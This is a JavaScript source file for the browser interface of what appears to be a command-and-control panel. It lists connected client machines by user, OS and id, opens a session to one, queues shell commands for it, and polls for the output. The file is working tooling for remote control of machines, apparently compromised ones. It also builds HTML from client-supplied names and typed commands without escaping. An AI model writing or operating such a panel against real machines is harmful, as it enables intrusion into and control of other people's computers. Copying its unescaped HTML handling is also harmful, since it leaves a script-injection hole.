
// C2 Logic
var currentC2Uid = null;
var c2PollInterval = null;

function loadC2Clients() {
    $.get('/api/c2/clients', function (data) {
        var list = $('#c2-client-list');
        list.empty();

        if (data.clients && data.clients.length > 0) {
            data.clients.forEach(function (client) {
                var activeClass = (currentC2Uid === client.uid) ? 'bg-blue-600/20 border-blue-500/30' : 'bg-slate-800 border-slate-700 hover:bg-slate-700';
                var statusColor = (client.status === 'online') ? 'text-emerald-400' : 'text-slate-500';
                var user = client.info.user || 'Unknown';
                var os = client.info.os || 'Unknown OS';

                var item = '<div class="p-3 rounded-lg border ' + activeClass + ' cursor-pointer transition-all" onclick="selectC2Client(\'' + client.uid + '\', \'' + user + '\', \'' + os + '\')">' +
                    '<div class="flex justify-between items-center mb-1">' +
                    '<span class="font-bold text-slate-200 truncate">' + user + '</span>' +
                    '<span class="text-xs ' + statusColor + '">●</span>' +
                    '</div>' +
                    '<div class="text-xs text-slate-400 truncate">' + client.uid + '</div>' +
                    '<div class="text-xs text-slate-500 truncate mt-1">' + os + '</div>' +
                    '</div>';
                list.append(item);
            });
        } else {
            list.html('<div class="text-center text-slate-600 py-4 italic">No active sessions</div>');
        }
    });
}

window.selectC2Client = function (uid, user, os) {
    currentC2Uid = uid;
    $('#c2-terminal-header span:first').text(user + ' (' + os + ')');
    $('#c2-status-indicator').removeClass('hidden');
    $('#c2-prompt').text(user + ' >');
    $('#c2-cmd-input').prop('disabled', false).focus();
    $('#c2-terminal-output').html('<div class="text-slate-500">Session connected. Type commands...</div>');

    loadC2Clients();

    if (c2PollInterval) clearInterval(c2PollInterval);
    c2PollInterval = setInterval(fetchC2Responses, 2000);
}

function fetchC2Responses() {
    if (!currentC2Uid) return;

    $.get('/api/c2/get_responses/' + currentC2Uid, function (data) {
        if (data.responses && data.responses.length > 0) {
            var term = $('#c2-terminal-output');
            data.responses.forEach(function (resp) {
                var outDiv = document.createElement('div');
                outDiv.className = "text-slate-300 whitespace-pre-wrap mb-2 border-l-2 border-blue-500 pl-2";
                outDiv.textContent = resp.output;
                term.append(outDiv);
            });
            term.scrollTop(term[0].scrollHeight);
        }
    });
}

function initC2() {
    $('#btn-refresh-c2').click(loadC2Clients);

    $('#c2-cmd-input').keydown(function (e) {
        if (e.key === 'Enter') {
            var cmd = $(this).val();
            if (!cmd.trim()) return;

            if (!currentC2Uid) {
                alert("Select a client first");
                return;
            }

            var term = $('#c2-terminal-output');
            var cmdDiv = document.createElement('div');
            cmdDiv.className = "mb-1 mt-2";
            cmdDiv.innerHTML = '<span class="text-emerald-500 font-bold mr-2">' + $('#c2-prompt').text() + '</span><span class="text-white">' + cmd + '</span>';
            term.append(cmdDiv);
            term.scrollTop(term[0].scrollHeight);

            $(this).val('');

            $.ajax({
                url: '/api/c2/queue_command',
                type: 'POST',
                data: JSON.stringify({ uid: currentC2Uid, cmd: cmd }),
                contentType: 'application/json',
                success: function (res) { }
            });
        }
    });

    setInterval(loadC2Clients, 5000);
    // Initial load
    loadC2Clients();
}

window.addEventListener('load', function () {
    initC2();
});
